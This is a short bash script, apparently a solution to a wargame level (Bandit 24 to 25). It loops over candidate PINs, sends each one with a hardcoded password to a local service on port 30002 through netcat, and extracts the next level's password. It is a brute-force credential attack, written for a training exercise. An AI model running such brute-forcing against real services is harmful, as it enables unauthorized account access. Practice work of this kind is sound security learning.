#!/bin/bash

for pin in {3714..3716}; do
echo "trying $pin..."
echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'Wrong' &> /dev/null
if [ $? == 0 ]; then
        echo "incorrect!"
else
        echo "found correct PIN: $pin"
        echo "$pin" >> bandit25-login-creds.txt
        echo -n "password of user bandit25: "
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'password of user bandit25' | awk '{print $7}'
        break
fi
sleep 2
done
